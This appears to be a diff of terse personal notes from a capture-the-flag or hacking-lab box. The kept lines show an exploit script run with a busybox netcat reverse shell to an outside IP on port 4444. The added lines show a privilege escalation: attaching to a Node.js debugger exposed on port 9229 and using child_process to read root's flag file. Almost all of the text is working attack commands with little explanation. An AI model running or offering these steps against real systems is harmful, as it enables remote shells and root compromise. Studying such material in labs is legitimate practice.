@@ -29,4 +29,9 @@ a cringe ass minimal linux needs busybox nc , also alpine is cringe aswell
 python3 shit.py http://ip "busybox nc 10.10.14.225 4444 -e /bin/bash" /// working script
 
 
+ps aux | grep node
+/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+node inspect 127.0.0.1:9229
+exec("process.getuid()")
+exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
 
